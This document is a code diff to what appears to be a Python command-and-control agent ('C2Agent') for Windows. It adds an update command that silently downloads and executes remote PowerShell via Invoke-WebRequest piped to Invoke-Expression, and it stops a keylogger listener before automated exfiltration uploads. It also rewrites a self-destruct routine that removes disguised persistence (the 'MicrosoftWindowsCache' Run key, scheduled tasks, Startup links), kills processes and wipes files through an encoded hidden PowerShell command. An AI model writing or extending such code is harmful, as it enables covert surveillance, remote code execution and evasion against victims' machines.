@@ -776,6 +776,16 @@ async def run_persistent_task(task_manager: PersistentTaskManager, task: Persist
         # === TASK COMPLETED - AUTO EXFILTRATION ===
         print(f"[LOOP END] {task.task_name} completed after {iteration} iterations")
         
+        # Stop listeners (keylogger) NOW to prevent file modification during upload
+        # This fixes "Too much data for declared Content-Length" errors
+        if task.task_id in ACTIVE_LISTENERS:
+            try:
+                print(f"[KEYLOG] Stopping listener for {task.task_id} before upload")
+                listener = ACTIVE_LISTENERS.pop(task.task_id)
+                listener.stop()
+            except Exception as e:
+                print(f"[ERROR] Failed to stop listener: {e}")
+
         # Give filesystem time to finish writing files
         await asyncio.sleep(2)
         
@@ -1007,6 +1017,47 @@ async def install_software(url: str) -> Tuple[str, bool]:
         return f"Install error: {e}", False
 
 
+
+async def update_agent(url: str) -> Tuple[str, bool]:
+    """
+    Update the agent by downloading and running the installer script.
+    The installer will kill this process and start the new one.
+    """
+    if platform.system() != "Windows":
+        return "Update only supported on Windows", False
+    
+    try:
+        # Validate URL
+        if not url.startswith("http"):
+             return "Invalid URL for update. Must be http/https", False
+             
+        # Command to run the installer
+        # We wrap in a short delay to allow this request to report back first
+        ps_command = f"Start-Sleep -Seconds 5; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri '{url}' -UseBasicParsing | Invoke-Expression"
+        
+        # Launch detached PowerShell
+        # Uses same technique as self_destruct to survive process kill
+        _detach = getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
+        _new_group = getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0x00000200)
+        
+        subprocess.Popen(
+            [
+                'powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass',
+                '-WindowStyle', 'Hidden', '-Command', ps_command
+            ],
+            creationflags=subprocess.CREATE_NO_WINDOW | _detach | _new_group,
+            close_fds=True,
+            stdin=subprocess.DEVNULL,
+            stdout=subprocess.DEVNULL,
+            stderr=subprocess.DEVNULL,
+        )
+        
+        return f"Update initiated using {url}. Agent will restart shortly.", True
+        
+    except Exception as e:
+        return f"Update failed to launch: {e}", False
+
+
 async def self_destruct() -> Tuple[str, bool]:
     """
     SELF DESTRUCT: Completely remove the agent from the system.
@@ -1039,95 +1090,63 @@ async def self_destruct() -> Tuple[str, bool]:
         kill_ps = "Get-WmiObject Win32_Process | Where-Object { ($_.Name -eq 'python.exe' -or $_.Name -eq 'pythonw.exe') -and $_.CommandLine -like '*agent.py*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }"
 
         # PowerShell script: wait so agent/batch exit and release handles, then read paths file and Remove-Item
-        delete_ps1 = temp_dir / 'cleanup_delete.ps1'
-        delete_ps1.write_text('''
-$pathsFile = Join-Path $env:TEMP "cleanup_paths.txt"
-if (-not (Test-Path $pathsFile)) { exit 0 }
-Start-Sleep -Seconds 10
-$dirs = Get-Content $pathsFile -ErrorAction SilentlyContinue
-foreach ($d in $dirs) {
-    $d = $d.Trim()
-    if ($d -and (Test-Path -LiteralPath $d)) {
-        Remove-Item -LiteralPath $d -Recurse -Force -ErrorAction SilentlyContinue
-    }
-}
-Remove-Item $pathsFile -Force -ErrorAction SilentlyContinue
-''', encoding='utf-8')
+async def self_destruct() -> Tuple[str, bool]:
+    """
+    SELF DESTRUCT: Completely remove the agent from the system.
+    Spawns a detached PowerShell process to clean up persistence, kill the agent, and remove files.
+    """
+    if platform.system() != "Windows":
+        return "Self-destruct only supported on Windows", False
+    
+    try:
+        install_dir = str(get_install_dir().resolve())
+        data_dir = str(DATA_DIR.resolve())
+        pid = os.getpid()
+        
+        # Robust cleanup script
+        ps_script = f"""
+        Start-Sleep -Seconds 4
+        
+        # 1. Remove Persistence
+        try {{
+            Unregister-ScheduledTask -TaskName "C2Agent" -Confirm:$false -ErrorAction SilentlyContinue
+            Remove-ItemProperty -Path "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" -Name "MicrosoftWindowsCache" -ErrorAction SilentlyContinue
+            Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Update.lnk" -Force -ErrorAction SilentlyContinue
+            Remove-Item "$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Agent.lnk" -Force -ErrorAction SilentlyContinue
+        }} catch {{ }}
 
-        # Create batch: cd out of install dir, persistence, kill, then launch PowerShell script (runs delayed delete in background)
-        batch_script = f'''@echo off
-cd /d "%TEMP%"
-
-echo [SELF_DESTRUCT] Phase 1: Removing persistence...
-schtasks /Delete /TN "C2Agent" /F >nul 2>&1
-schtasks /Delete /TN "MicrosoftWindowsCache" /F >nul 2>&1
-reg delete "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1
-reg delete "HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "MicrosoftWindowsCache" /f >nul 2>&1
-del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Update.lnk" /f /q >nul 2>&1
-del "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\C2Agent.lnk" /f /q >nul 2>&1
-
-echo [SELF_DESTRUCT] Phase 2: Stopping agent process...
-timeout /t 2 /nobreak >nul
-powershell -NoProfile -NonInteractive -Command "{kill_ps}" >nul 2>&1
-taskkill /F /FI "IMAGENAME eq pythonw.exe" >nul 2>&1
-taskkill /F /FI "IMAGENAME eq python.exe" >nul 2>&1
-timeout /t 2 /nobreak >nul
-
-del "%~f0"
-'''
+        # 2. Kill Agent Processes
+        try {{
+            Stop-Process -Id {pid} -Force -ErrorAction SilentlyContinue
+            Get-WmiObject Win32_Process | Where-Object {{ ($_.Name -like 'python*' -and $_.CommandLine -like '*agent.py*') }} | ForEach-Object {{ Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }}
+        }} catch {{ }}
         
-        batch_path.write_text(batch_script, encoding='utf-8')
+        Start-Sleep -Seconds 2
         
-        cleanup_report.append("✓ Cleanup script created")
+        # 3. Delete Files (Install Dir + Data Dir)
+        try {{
+            if (Test-Path '{install_dir}') {{ Remove-Item '{install_dir}' -Recurse -Force -ErrorAction SilentlyContinue }}
+            if (Test-Path '{data_dir}') {{ Remove-Item '{data_dir}' -Recurse -Force -ErrorAction SilentlyContinue }}
+        }} catch {{ }}
+        """
         
-        # Send final goodbye message
-        try:
-            await send_telegram_message(
-                f"💣 <b>SELF DESTRUCT EXECUTED</b>\n\n"
-                f"Node: {socket.gethostname()}\n"
-                f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
-                f"All traces have been removed. Goodbye."
-            )
-            cleanup_report.append("✓ Final message sent")
-        except:
-            pass
+        # Use EncodedCommand to avoid quoting/escaping issues
+        encoded_command = base64.b64encode(ps_script.encode('utf-16le')).decode('utf-8')
         
-        # Start PowerShell delete script directly as detached process (survives when agent exits)
-        # Batch "start /b" children die when batch exits; agent-started detached process keeps running
-        _detach = getattr(subprocess, 'DETACHED_PROCESS', 0)
-        _new_group = getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0)
-        try:
-            subprocess.Popen(
-                [
-                    'powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass',
-                    '-WindowStyle', 'Hidden', '-File', str(delete_ps1.resolve())
-                ],
-                cwd=str(temp_dir),
-                creationflags=subprocess.CREATE_NO_WINDOW | _detach | _new_group,
-                close_fds=True,
-                stdin=subprocess.DEVNULL,
-                stdout=subprocess.DEVNULL,
-                stderr=subprocess.DEVNULL,
-            )
-        except Exception:
-            pass
+        # Launch detached PowerShell
+        _detach = getattr(subprocess, 'DETACHED_PROCESS', 0x00000008)
+        _new_group = getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0x00000200)
         
-        # Execute batch (persistence + kill); runs after delete script is already started
         subprocess.Popen(
-            ['cmd', '/c', str(batch_path)],
-            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS if hasattr(subprocess, 'DETACHED_PROCESS') else subprocess.CREATE_NO_WINDOW,
+            ['powershell.exe', '-NoProfile', '-ExecutionPolicy', 'Bypass', '-WindowStyle', 'Hidden', '-EncodedCommand', encoded_command],
+            creationflags=subprocess.CREATE_NO_WINDOW | _detach | _new_group,
             close_fds=True
         )
         
-        cleanup_report.append("✓ Cleanup script launched")
+        # Send goodbye
+        await send_telegram_message("💥 <b>SELF DESTRUCT INITIATED</b>\nTerminating in 4 seconds...")
         
-        report = "\n".join(cleanup_report) + "\n\n💥 Self-destruct sequence initiated. Agent terminating..."
-        
-        # Give the report a moment to be sent back
-        await asyncio.sleep(1)
-        
-        # Force exit (the batch script will clean up everything)
-        os._exit(0)
+        return "Self-destruct initiated. Process will terminate and files will be deleted.", True
         
     except Exception as e:
         return f"Self-destruct error: {e}", False
@@ -1294,6 +1313,15 @@ async def process_task(
         else:
             return "No active persistent tasks", True, extra_data
     
+    # === UPDATE AGENT ===
+    elif task_type == 'update':
+        url = command.strip()
+        if not url:
+            return "Update requires a URL (the installer URL)", False, extra_data
+            
+        output, success = await update_agent(url)
+        return output, success, extra_data
+
     # === SELF DESTRUCT ===
     elif task_type == 'self_destruct':
         try:
